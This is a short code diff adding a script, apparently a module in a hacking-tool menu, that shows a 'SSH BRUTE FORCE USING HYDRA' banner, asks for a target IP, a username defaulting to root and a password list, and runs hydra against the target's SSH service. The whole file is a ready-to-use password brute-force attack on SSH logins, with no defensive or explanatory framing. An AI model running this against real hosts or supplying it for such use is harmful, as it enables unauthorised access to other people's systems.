@@ -1,0 +1,14 @@
+#!require=["hydra"]; precompile=False; platform=["linux"]
+
+scr.print_center(r"""
+┏ • - • - • - • - • - • - • - • ღ❦ღ┓
+          SSH BRUTE FORCE
+            USING HYDRA
+┗ღ❦ღ • - • - • - • - • - • - • - •-┛
+""")
+
+host = zzz.prompt("Enter Target IP")
+user = zzz.prompt("Username", default="root")
+passlist = zzz.prompt("Passlist", default="passlist.txt")
+
+zzz(f"hydra -l {user} -P {passlist} -t 4 ssh://{host}")
